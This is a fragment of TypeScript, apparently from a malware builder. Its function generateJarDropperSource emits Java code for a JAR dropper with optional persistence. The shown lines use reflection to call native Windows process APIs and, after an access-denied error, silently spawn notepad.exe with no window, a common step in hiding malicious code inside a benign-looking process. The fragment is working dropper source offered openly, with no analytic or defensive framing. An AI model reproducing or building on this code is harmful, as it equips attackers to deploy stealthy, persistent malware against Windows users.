...
function generateJarDropperSource(jarPersist: boolean): string {
  ...
  return [
    ...
    "    int gle=((Integer)iv.invoke(fGLE,Integer.class,new Object[]{})).intValue();",
    "    if(Boolean.FALSE.equals(cpOk)&&gle==5){",
    "      MC.getMethod(\"clear\").invoke(siMem);setI.invoke(siMem,0L,104);setI.invoke(siMem,60L,1);setS.invoke(siMem,64L,(short)0);",
    "      MC.getMethod(\"clear\").invoke(piMem);",
    "      cpOk=(Boolean)iv.invoke(fCPA,Boolean.class,new Object[]{NP,\"C:\\\\Windows\\\\System32\\\\notepad.exe\",NP,NP,false,0x08000000,NP,NP,siMem,piMem});",
